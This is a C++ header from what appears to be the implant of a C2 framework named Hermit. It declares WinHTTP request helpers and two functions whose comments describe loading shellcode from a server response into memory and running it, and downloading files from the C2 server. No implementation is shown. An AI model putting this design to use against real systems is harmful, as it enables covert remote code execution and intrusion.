#ifndef HERMIT_WINHTTP_HPP
#define HERMIT_WINHTTP_HPP

#include <windows.h>
#include <winhttp.h>
#include <string>
#include "common.hpp"
#include "convert.hpp"

VOID WinHttpCloseHandles(
	HINTERNET hSession,
	HINTERNET hConnect,
	HINTERNET hRequest
);
struct WinHttpHandlers {
	HINTERNET hSession;
	HINTERNET hConnect;
};
WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort);
struct WinHttpResponse {
	BOOL bResult;
	HINTERNET hRequest;
	DWORD dwStatusCode;
};
WinHttpResponse SendRequest(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	LPCWSTR lpMethod,
	LPCWSTR lpHeaders,
	LPVOID lpData,
	DWORD dwDataLength
);
// It's used for reading large data from responses.
// The data is saved at 'outFile'.
BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);
// It's used for loading shellcode into memory and run.
BOOL ReadResponseShellcode(HINTERNET hRequest);
// Download a file from the C2 server
BOOL DownloadFile(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& wSrc,
	const std::wstring& wDest
);

#endif // HERMIT_WINHTTP_HPP